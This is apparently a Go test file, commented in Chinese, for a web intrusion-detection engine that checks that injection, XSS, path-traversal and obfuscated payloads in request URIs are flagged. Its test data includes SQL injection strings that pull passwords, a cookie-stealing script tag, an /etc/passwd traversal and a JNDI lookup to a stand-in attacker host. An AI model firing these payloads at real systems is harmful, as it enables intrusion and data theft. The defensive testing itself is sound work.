package detect

import (
	"strings"
	"testing"
	"time"

	"netsa/internal/model"
)

// 同一个参数里的注入特征不因末尾追加一个只被提到的写法（<svg>、alert()）就被当成普通文字。
func TestInertProseNeedsInertMatch(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, uri := range []string{
		"/item?id=-1%20union%20select%201,password,3%20from%20users--%20%3Csvg%3E",
		"/item?id=-1%20union%20select%20table_name%20from%20information_schema.tables--%20%3Cscript%3E",
		"/item?id=-1%20union%20select%201,password,3%20from%20users--%20alert()",
	} {
		h, ok := hitIDs(e.Inspect(web("GET", uri, 200, "Mozilla/5.0")))["sqli-union"]
		if !ok || h.Weak || h.Severity < model.SevHigh {
			t.Errorf("%s: SQL 注入不应被当成普通文字: %+v", uri, h)
		}
	}
	// 脚本标签之后还有调用：会执行，不是提到标签名
	if h, ok := hitIDs(e.Inspect(web("GET", "/search?q=hello%20world%3Cscript%3Ealert()%3C/script%3E", 200, "Mozilla/5.0")))["xss-script"]; !ok || h.Weak {
		t.Errorf("<script>alert()</script> 不应被当成普通文字: %+v", h)
	}
}

// 把载荷放在两个参数 x=/* 与 y=*/ 之间：应用照常收到，检测同样要看到。
func TestPayloadInsideCommentDetected(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct{ uri, cat string }{
		{"/a.php?x=/*&f=../../../../etc/passwd&y=*/", CatTraversal},
		{"/api?a=/*&x=${jndi:ldap://evil.example/a}&b=*/", ""},
		{"/s?q=/*<script>alert(document.cookie)</script>*/", CatXSS},
		{"/p.php?a=/*&id=1%20union%20select%201,2,3%20from%20users&b=*/", CatSQLi},
	} {
		hits := e.Inspect(web("GET", c.uri, 200, "Mozilla/5.0"))
		found := false
		for _, h := range hits {
			if !h.TagOnly && h.Severity >= model.SevMedium && (c.cat == "" || h.Category == c.cat) {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: 注释中的载荷没有检出: %v", c.uri, ruleIDs(hits))
		}
	}
	// 注释混淆仍按去掉注释后的写法识别
	if _, ok := hitIDs(e.Inspect(web("GET", "/a?q=1+UNION/**/SELECT+1,2,3", 200, "Mozilla/5.0")))["sqli-union"]; !ok {
		t.Error("union/**/select 应命中")
	}
}

// 方法名不标准的请求行（解析器没有拆出方法，整行写在 URI 里）按其中的目标完整检测。
func TestOddMethodRequestInspected(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, line := range []string{
		"AAAAAAAAAAAAAAAAAAAAAAAA /index.php?id=1%20union%20select%201,2,3%20from%20users--%20- HTTP/1.1",
		"get /index.php?id=1%20union%20select%201,2,3%20from%20users--%20- HTTP/1.1",
		"G3T /index.php?id=1%20union%20select%201,2,3%20from%20users--%20- HTTP/1.1",
	} {
		ids := hitIDs(e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.9", URI: line, Status: 200, Bytes: 5120, Time: time.Now()}))
		if _, ok := ids["sqli-union"]; !ok {
			t.Errorf("%q: 应按目标检测出 SQL 注入: %v", line, keys(ids))
		}
		if _, ok := ids["proto-badmethod"]; !ok {
			t.Errorf("%q: 应另记一条非标准请求方法", line)
		}
	}
	// 真正的二进制探测、已识别的协议探测仍只记协议异常
	for _, raw := range []string{"\x16\x03\x01\x02\x00\x01\x00\x01", "SSH-2.0-Go", "\x03\x00\x00\x13\x0e\xe0 Cookie: mstshash=a"} {
		ids := hitIDs(e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.9", URI: raw, Status: 400, Time: time.Now()}))
		if _, ok := ids["proto-nonhttp"]; !ok || len(ids) != 1 {
			t.Errorf("%q: 只应记协议异常: %v", raw, keys(ids))
		}
	}
	if _, _, ok := oddRequestLine("hello world"); ok {
		t.Error("不是请求行")
	}
}

// 重复路径段的超长 URL：每个漏洞接口签名对同一条路径只判断一次，耗时与长度成线性。
func TestVulnPathRepeatedSegmentsLinear(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, seg := range []string{"/attachment", "/reportserver", "/index.php"} {
		uri := strings.Repeat(seg, 64<<10/len(seg))
		start := time.Now()
		e.Inspect(web("GET", uri, 404, "Mozilla/5.0"))
		if d := time.Since(start); d > 300*time.Millisecond {
			t.Errorf("%s 重复到 64 KB 耗时 %v", seg, d)
		}
	}
}

func keys(m map[string]model.Hit) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// 名称本身带数字的系统工具按原名识别，不被当成版本号去掉。
func TestProcNameKeepsBuiltinDigits(t *testing.T) {
	for in, want := range map[string]string{
		`C:\Windows\System32\rundll32.exe`: "rundll32", `C:\Windows\System32\regsvr32.exe`: "regsvr32",
		"/usr/sbin/php-fpm8.2": "php-fpm", "/usr/bin/python3.11": "python", "tomcat9": "tomcat9", "procdump64.exe": "procdump",
	} {
		if got := procName(in); got != want {
			t.Errorf("procName(%q) = %q，应为 %q", in, got, want)
		}
	}
}
